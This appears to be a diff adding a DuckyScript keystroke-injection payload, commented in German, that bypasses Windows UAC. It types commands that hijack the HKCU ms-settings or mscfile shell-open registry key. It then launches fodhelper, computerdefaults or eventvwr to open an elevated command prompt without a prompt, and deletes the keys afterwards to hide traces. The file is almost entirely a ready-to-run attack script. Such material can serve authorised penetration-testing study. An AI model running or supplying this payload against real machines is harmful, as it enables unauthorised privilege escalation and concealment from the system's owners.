@@ -1,0 +1,62 @@
+REM ============================================================
+REM  W02a.6 - UAC Bypass: Elevated Admin Shell
+REM  Autoren: Raphael Bleier, Joachim Lugger
+REM  Ziel-OS: Windows 10/11 + Windows Server 2016/2019/2022
+REM           (AD-Netzwerke: lokale Admins + Domain Admins)
+REM
+REM  Quelle: "Under the Radar: Mastering the Art of
+REM           Windows UAC Evasion" (Medium)
+REM
+REM  ── Technik-Uebersicht ────────────────────────────────────
+REM
+REM  PRIM  fodhelper.exe  → Win10/11, Server 2016/2019/2022
+REM        Registry: HKCU\...\ms-settings\Shell\Open\command
+REM        + DelegateExecute = "" (Pflicht!)
+REM        → aktiv in Phase 1 (Standard)
+REM
+REM  ALT-A computerdefaults.exe → Win10/11, Server 2019+
+REM        Gleicher Registry-Key wie fodhelper
+REM        → Phase 1 "fodhelper" durch "computerdefaults" ersetzen
+REM
+REM  ALT-B eventvwr.exe → Server 2008 R2 / 2012 / aeltere Win
+REM        Registry: HKCU\...\mscfile\shell\open\command
+REM        KEIN DelegateExecute noetig
+REM        → Phase 1 (ALT-B) einkommentieren, PRIM auskommentieren
+REM        → Phase 3 (ALT-B) einkommentieren, PRIM auskommentieren
+REM
+REM  ── Voraussetzung ────────────────────────────────────────
+REM  Benutzer MUSS Mitglied der lokalen Gruppe "Administrators"
+REM  oder "Domain Admins" sein. UAC-Bypass hebt nur den
+REM  gefilterten Admin-Token auf - kein Exploit gegen Standard-User!
+REM
+REM  ── Ablauf ───────────────────────────────────────────────
+REM    1. HKCU Registry-Key fuer auto-elevate Binary hijacken
+REM    2. Binary starten - Windows erhoeht Prozess ohne UAC-Dialog
+REM    3. Elevated cmd.exe oeffnet sich (Mandatory Level: High)
+REM    4. Registry-Schluessel bereinigen (OPSEC)
+REM ============================================================
+
+REM ── Phase 1: Registry-Key setzen + UAC-Bypass ausfuehren ──
+REM    PRIM: fodhelper (Win10/11 + Server 2016+)
+DELAY 2000
+GUI r
+DELAY 600
+STRINGLN cmd /c reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d cmd /f&&reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f&&fodhelper
+
+REM    ALT-A: computerdefaults statt fodhelper (kommentieren/auskommentieren):
+REM STRINGLN cmd /c reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d cmd /f&&reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f&&computerdefaults
+
+REM    ALT-B: eventvwr fuer Server 2008 R2 / 2012 (mscfile, kein DelegateExecute):
+REM STRINGLN cmd /c reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /d cmd /f&&eventvwr
+
+REM ── Phase 2: Warten bis elevated cmd.exe erscheint (~3s) ──
+DELAY 4500
+
+REM ── Phase 3: Registry bereinigen (OPSEC) ──────────────────
+REM    PRIM / ALT-A: ms-settings loeschen
+GUI r
+DELAY 600
+STRINGLN cmd /c reg delete "HKCU\Software\Classes\ms-settings" /f
+
+REM    ALT-B: mscfile loeschen (falls eventvwr verwendet):
+REM STRINGLN cmd /c reg delete "HKCU\Software\Classes\mscfile" /f
